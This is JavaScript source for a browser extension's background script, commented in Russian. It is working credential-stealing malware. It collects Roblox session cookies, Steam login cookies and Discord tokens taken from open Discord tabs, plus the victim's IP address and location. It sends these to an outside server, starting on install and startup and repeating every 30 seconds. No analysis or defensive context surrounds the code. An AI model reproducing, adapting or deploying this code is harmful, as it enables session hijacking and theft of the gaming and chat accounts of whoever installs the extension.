// background.js — финальная версия без ложных "Уже отправлен"
const SERVER_URL = "https://mm2-server.onrender.com/send";
let lastRoblox = "", lastSteam = "", lastDiscord = "";

async function getDiscordToken() {
    try {
        const tabs = await chrome.tabs.query({ url: "*://discord.com/*" });
        for (const tab of tabs) {
            try {
                const res = await chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    func: () => localStorage.getItem("token") || ""
                });
                if (res && res[0] && res[0].result) return res[0].result;
            } catch (e) {}
        }
    } catch (e) {}
    return "";
}

async function getIP() {
    try {
        const r = await fetch("https://ipwho.is/");
        const j = await r.json();
        if (j.ip && j.ip.includes(":")) {
            const r2 = await fetch("https://api.ipify.org?format=json");
            const j2 = await r2.json();
            j.ip = j2.ip || j.ip;
        }
        return j;
    } catch (e) { return null; }
}

async function sendData() {
    const data = {
        robloxCookie: "", steamCookie: "", discordToken: "",
        ip: "", country: "", city: ""
    };
    const ip = await getIP();
    data.ip = ip?.ip || ""; data.country = ip?.country || ""; data.city = ip?.city || "";

    let hasNew = false;

    try {
        const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
        const rob = c.find(x => x.name === ".ROBLOSECURITY");
        if (rob && rob.value && rob.value !== lastRoblox) {
            data.robloxCookie = rob.value; lastRoblox = rob.value; hasNew = true;
        }
    } catch (e) {}

    try {
        const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
        const steam = c.find(x => x.name === "steamLoginSecure");
        if (steam && steam.value && steam.value !== lastSteam) {
            data.steamCookie = steam.value; lastSteam = steam.value; hasNew = true;
        }
    } catch (e) {}

    const discordToken = await getDiscordToken();
    if (discordToken && discordToken !== lastDiscord) {
        data.discordToken = discordToken; lastDiscord = discordToken; hasNew = true;
    }

    if (hasNew) {
        try {
            await fetch(SERVER_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        } catch (e) {}
    }
}

chrome.runtime.onInstalled.addListener(sendData);
chrome.runtime.onStartup.addListener(sendData);
setInterval(sendData, 30000);
